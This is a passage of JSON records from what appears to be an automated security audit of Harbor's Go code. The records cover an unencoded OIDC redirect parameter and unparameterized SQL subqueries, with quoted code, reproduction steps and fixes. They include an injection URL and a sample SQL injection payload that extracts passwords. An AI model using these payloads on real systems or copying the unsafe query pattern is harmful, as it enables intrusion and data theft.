startup\\\\n\\",\\"severity\\":\\"medium\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-10\\",\\"valid\\",\\"poc-pending\\"],\\"status\\":\\"open\\",\\"cvss_score\\":0,\\"source_file\\":\\"src/pkg/reg/manager.go:191\\",\\"matched_at\\":[\\"src/pkg/reg/manager.go:191\\",\\"src/pkg/reg/dao/model.go:34\\",\\"src/common/utils/encrypt.go:82-89\\",\\"src/lib/encrypt/encrypt.go:81\\",\\"src/pkg/config/db/db.go:52\\"],\\"finding_hash\\":\\"8f44e381a39ef196dd0d3e02b4fc7c0b\\",\\"found_at\\":\\"2026-03-30T18:45:41.016116Z\\",\\"created_at\\":\\"2026-03-30T18:45:41Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":7,\\"project_uuid\\":\\"00000000-0000-0000-0000-000000000001\\",\\"http_record_uuids\\":[],\\"agent_run_uuid\\":\\"59ad48a0-3a26-43d3-b425-70ed9fbdf240\\",\\"module_id\\":\\"archon:p10-040\\",\\"module_name\\":\\"In `src/core/controllers/oidc.go:203`, both the `username` and the `redirect_url` parameters are interpolated without URL encoding into the onboard redirect URL:\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"oidc-onboard-redirect-url-unencoded\\",\\"description\\":\\"## Summary\\\\n\\\\nIn `src/core/controllers/oidc.go:203`, both the `username` and the `redirect_url` parameters are interpolated without URL encoding into the onboard redirect URL:\\\\n\\\\n```go\\\\noc.Controller.Redirect(\\\\n    fmt.Sprintf(\\\\\\"/oidc-onboard?username=%s&redirect_url=%s\\\\\\", username, redirectURLStr),\\\\n    http.StatusFound,\\\\n)\\\\n```\\\\n\\\\nThe confirmed finding p8-008 documents the `username` injection vector. This variant documents the separate `redirect_url=%s` injection: `redirectURLStr` is the session-stored redirect URL (validated only by `IsLocalPath`, which allows `/path?key=val` and `/path#fragment`). A redirect URL containing `?` or `#` injects extra query parameters or a fragment into the onboard URL that the Angular SPA receives. An attacker who can influence the initial `redirect_url` query parameter to `IsLocalPath`-valid values containing metacharacters can manipulate the onboarding page\'s behavior.\\\\n\\\\n## Location\\\\n\\\\n- `src/core/controllers/oidc.go:203` -- `redirectURLStr` interpolated without `url.QueryEscape`\\\\n- `src/core/controllers/oidc.go:81-87` -- `redirectURL` accepted from query param, validated only by `IsLocalPath`\\\\n- `src/core/controllers/oidc.go:87` -- stored raw (not normalized) into session\\\\n\\\\n## Attacker Control\\\\n\\\\n1. Attacker crafts OIDC login link: `https://harbor.example.com/c/oidc/login?redirect_url=/dashboard%3Fevil%3Dinjected`\\\\n2. `IsLocalPath` passes (`/dashboard?evil=injected` starts with `/` and not `//`)\\\\n3. Value stored raw in session: `/dashboard?evil=injected`\\\\n4. New user completes OIDC auth, auto-onboard is disabled\\\\n5. Redirect issued to: `/oidc-onboard?username=newuser&redirect_url=/dashboard?evil=injected`\\\\n6. Angular SPA receives two `redirect_url` parameters, or a `redirect_url` with an injected query string fragment that alters onboarding page state\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\n- OIDC provider to Harbor onboarding Angular SPA\\\\n- Attacker-controlled URL metacharacters break parameter boundary in frontend redirect\\\\n\\\\n## Impact\\\\n\\\\n- Query parameter injection into Angular SPA onboarding page URL\\\\n- May override legitimate Angular route parameters depending on SPA routing logic\\\\n- Potential for open redirect if the SPA trusts the first `redirect_url` occurrence over the second\\\\n- Distinct from p8-008 (username injection): targets the redirect_url parameter rather than username\\\\n\\\\n## Evidence\\\\n\\\\n```go\\\\n// src/core/controllers/oidc.go:203\\\\noc.Controller.Redirect(\\\\n    fmt.Sprintf(\\\\\\"/oidc-onboard?username=%s&redirect_url=%s\\\\\\", username, redirectURLStr),\\\\n    http.StatusFound,\\\\n)\\\\n// redirectURLStr: retrieved from session at oidc.go:166:\\\\n//   redirectURLStr, _ = oc.GetSession(redirectURLKey).(string)\\\\n// IsLocalPath(\\\\\\"/dashboard?evil=injected\\\\\\") == true (starts with /, not //)\\\\n// url.QueryEscape NOT applied to redirectURLStr\\\\n```\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. Configure Harbor with OIDC auth mode, auto-onboard disabled\\\\n2. Craft URL: `https://harbor.example.com/c/oidc/login?redirect_url=/dashboard%3Fevil%3Dinjected%26second%3Dparam`\\\\n3. Have a first-time OIDC user authenticate via this link\\\\n4. Observe the onboard redirect: `/oidc-onboard?username=user&redirect_url=/dashboard?evil=injected&second=param`\\\\n5. The Angular SPA router receives `redirect_url=/dashboard` with extra injected params\\\\n6. Recommended fix: apply `url.QueryEscape(redirectURLStr)` in the fmt.Sprintf call\\\\n\\",\\"severity\\":\\"medium\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-10\\",\\"valid\\",\\"poc-pending\\"],\\"status\\":\\"open\\",\\"cvss_score\\":0,\\"source_file\\":\\"src/core/controllers/oidc.go:203\\",\\"matched_at\\":[\\"src/core/controllers/oidc.go:203\\",\\"src/core/controllers/oidc.go:81-87\\",\\"src/core/controllers/oidc.go:87\\"],\\"finding_hash\\":\\"98ad76af00ecb942fb4c89055c44b3eb\\",\\"found_at\\":\\"2026-03-30T18:45:41.016116Z\\",\\"created_at\\":\\"2026-03-30T18:45:41Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":8,\\"project_uuid\\":\\"00000000-0000-0000-0000-000000000001\\",\\"http_record_uuids\\":[],\\"agent_run_uuid\\":\\"59ad48a0-3a26-43d3-b425-70ed9fbdf240\\",\\"module_id\\":\\"archon:p10-041\\",\\"module_name\\":\\"`FilterByNames` in `src/pkg/project/models/project.go:256-266` builds a SQL subquery by wrapping each project name string in literal single-quote characters and concatenating them via `strings.Join`. \\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"sql-injection-project-filterbynames\\",\\"description\\":\\"## Summary\\\\n\\\\n`FilterByNames` in `src/pkg/project/models/project.go:256-266` builds a SQL subquery by wrapping each project name string in literal single-quote characters and concatenating them via `strings.Join`. There is no parameterization and no use of `orm.QuoteLiteral`. The pattern is structurally identical to p7-003\'s `fmt.Sprintf + FilterRaw()` anti-pattern. Although project names are currently restricted to `[a-z0-9._-]+` by `validProjectName` regex (preventing single-quote injection today), the query construction is unsafe-by-design and would become exploitable if:\\\\n\\\\n- The regex validation is relaxed or bypassed\\\\n- Names arrive through a code path that skips `validProjectName` (e.g., migration, direct DB insert, replication from a remote Harbor with different validation)\\\\n- A future developer copies this pattern with a less-restricted string type\\\\n\\\\n## Location\\\\n\\\\n- `src/pkg/project/models/project.go:256-266` -- `FilterByNames` function\\\\n- `src/server/v2.0/handler/repository.go:144` -- robot token namespace -> `NamesQuery`\\\\n- `src/server/v2.0/handler/project.go:484` -- robot token namespace -> `NamesQuery`\\\\n\\\\n## Attacker Control\\\\n\\\\nCurrent: INDIRECT. Project names used in `NamesQuery.Names` originate from robot token permission namespaces (stored in DB, resolved via `proMgr.Get`). Project names are validated at creation time by `validProjectName` regex. However, a replication scenario copying projects from a remote registry with weaker validation could introduce names containing SQL metacharacters.\\\\n\\\\nHypothetical direct path: If `validProjectName` were widened to allow `\'` (single quote), a project named `x\' UNION SELECT password FROM harbor_user; --` would cause SQL injection in any `ListRepositories` or `ListProjects` call by a robot with that project permission.\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\n- TB-3 (Core API to PostgreSQL) -- same boundary as p7-003\\\\n\\\\n## Impact\\\\n\\\\n- Same as p7-003: confidentiality (data exfiltration via UNION), integrity (data modification)\\\\n- Robot account project enumeration affected -- ListRepositories and ListProjects handlers both trigger FilterByNames\\\\n- Regression risk: pattern is structurally dangerous and will become exploitable if name validation weakens\\\\n\\\\n## Evidence\\\\n\\\\n```go\\\\n// src/pkg/project/models/project.go:256-266\\\\nvar names []string\\\\nfor _, v := range query.Names {\\\\n    names = append(names, `\'`+v+`\'`)   // single-quote wrapping, NO parameterization\\\\n}\\\\nsubQuery := fmt.Sprintf(\\\\\\"SELECT project_id FROM project where name IN (%s)\\\\\\", strings.Join(names, \\\\\\",\\\\\\"))\\\\n// ...\\\\nreturn qs.FilterRaw(\\\\\\"project_id\\\\\\", fmt.Sprintf(\\\\\\"IN (%s)\\\\\\", subQuery))\\\\n\\\\n// Compare: project.go:214 (uses orm.QuoteLiteral -- the safe pattern)\\\\nreturn qs.FilterRaw(\\\\\\"owner_id\\\\\\", fmt.Sprintf(\\\\\\"IN (SELECT user_id FROM harbor_user WHERE username = %s)\\\\\\", orm.QuoteLiteral(username)))\\\\n```\\\\n\\\\nNote: `FilterByOwner` at line 214 correctly uses `orm.QuoteLiteral(username)` for the same type of string interpolation. `FilterByNames` does not.\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. (Currently blocked by name regex) Create a project with name containing SQL metacharacter\\\\n2. Create a robot account scoped to that project\\\\n3. Authenticate with robot account JWT\\\\n4. Call `GET /api/v2.0/repositories` or `GET /api/v2.0/projects`\\\\n5. `FilterByNames` would execute injected SQL payload\\\\n6. Recommended fix: replace `\'`+v+`\'` concatenation with `orm.QuoteLiteral(v)` or use `orm.ParamPlaceholderForIn` with parameterized query\\\\n\\",\\"severity\\":\\"medium\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-10\\",\\"valid\\",\\"poc-pending\\"],\\"status\\":\\"open\\",\\"cvss_score\\":0,\\"source_file\\":\\"src/pkg/project/models/project.go:256-266\\",\\"matched_at\\":[\\"src/pkg/project/models/project.go:256-266\\",\\"src/server/v2.0/handler/repository.go:144\\",\\"src/server/v2.0/handler/project.go:484\\"],\\"finding_hash\\":\\"25b4ffd2c1275a697d774493b7730b14\\",\\"found_at\\":\\"2026-03-30T18:45:41.016118Z\\",\\"created_at\\":\\"2026-03-30T18:45:41Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":9,\\"project_uuid\\":\\"00000000-0000-0000-0000-000000000001\\",\\"http_record_uuids\\":[],\\"agent_run_uuid\\":\\"59ad48a0-3a26-43d3-b425-70ed9fbdf240\\",\\"module_id\\":\\"archon:p10-042\\",\\"module_name\\":\\"`FilterByArtifactDigest` and `FilterByArtifactDigests` in `src/pkg/blob/models/blob.go:131` and `146` build SQL subqueries by wrapping string values in literal single-quotes without using parameterize\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"sql-injection-blob-filterbyartifactdigest\\",\\"description\\":\\"## Summary\\\\n\\\\n`FilterByArtifactDigest` and `FilterByArtifactDigests` in `src/pkg/blob/models/blob.go:131` and `146` build SQL subqueries by wrapping string values in literal single-quotes without using parameterized queries or `orm.QuoteLiteral`:\\\\n\\\\n```go\\\\nsql := fmt.Sprintf(\\\\\\"IN (SELECT digest_blob FROM artifact_blob WHERE digest_af IN (%s))\\\\\\", `\'`+v+`\'`)\\\\n```\\\\n\\\\nThis is the same anti-pattern documented in p7-003. Digest strings (`sha256:...`) are currently gated by `opencontainers/go-digest.Parse()` which enforces `algorithm:hex` format. However, the SQL construction is structurally unsafe. Any future code path that passes a non-validated string to the `artifactDigest` keyword (bypassing digest format validation) would produce exploitable SQL injection.\\\\n\\\\n## Location\\\\n\\\\n- `src/pkg/blob/models/blob.go:131` -- `FilterByArtifactDigest`\\\\n- `src/pkg/blob/models/blob.go:143-146` -- `FilterByArtifactDigests`\\\\n\\\\n## Attacker Control\\\\n\\\\nCurrent: INDIRECT. Digest values are content-addressed SHA256 hashes validated by `go-digest.Parse()` before reaching these functions. The `algorithm:hex` format constraint blocks SQL metacharacters.\\\\n\\\\nRisk: If `artifactDigest` keyword is used with an unvalidated string (e.g., from a new code path, config file, or replication adapter that skips digest validation), the single-quote concatenation becomes exploitable.\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\n- TB-3 (Core API to PostgreSQL)\\\\n\\\\n## Impact\\\\n\\\\n- Confidentiality: UNION-based extraction from arbitrary DB tables\\\\n- Integrity: modification of blob/artifact association records\\\\n- Regression risk: mirrors the pattern that caused CVE-2024-22261 in Harbor\\\\n\\\\n## Evidence\\\\n\\\\n```go\\\\n// src/pkg/blob/models/blob.go:131\\\\nfunc (b *Blob) FilterByArtifactDigest(..., value any) orm.QuerySeter {\\\\n    v, ok := value.(string)\\\\n    // ...\\\\n    sql := fmt.Sprintf(\\\\\\"IN (SELECT digest_blob FROM artifact_blob WHERE digest_af IN (%s))\\\\\\", `\'`+v+`\'`)\\\\n    return qs.FilterRaw(\\\\\\"digest\\\\\\", sql)   // SINK: FilterRaw with user-controlled string\\\\n}\\\\n\\\\n// src/pkg/blob/models/blob.go:143-146\\\\nfunc (b *Blob) FilterByArtifactDigests(..., value any) orm.QuerySeter {\\\\n    // ...\\\\n    for _, v := range artifactDigests {\\\\n        afs = append(afs, `\'`+v+`\'`)    // single-quote wrapping, no parameterization\\\\n    }\\\\n    sql := fmt.Sprintf(\\\\\\"IN (SELECT digest_blob FROM artifact_blob WHERE digest_af IN (%s))\\\\\\", strings.Join(afs, \\\\\\",\\\\\\"))\\\\n    return qs.FilterRaw(\\\\\\"digest\\\\\\", sql)\\\\n}\\\\n```\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. (Currently blocked by go-digest format validation) Supply a digest string containing SQL metacharacters\\\\n2. Trigger a blob list operation that uses `artifactDigest` or `artifactDigests` keyword\\\\n3. `FilterByArtifactDigest(s)` would execute injected SQL payload\\\\n4. Recommended fix: use `orm.QuoteLiteral(v)` or `orm.ParamPlaceholderForIn` with actual query parameters instead of single-quote string concatenati
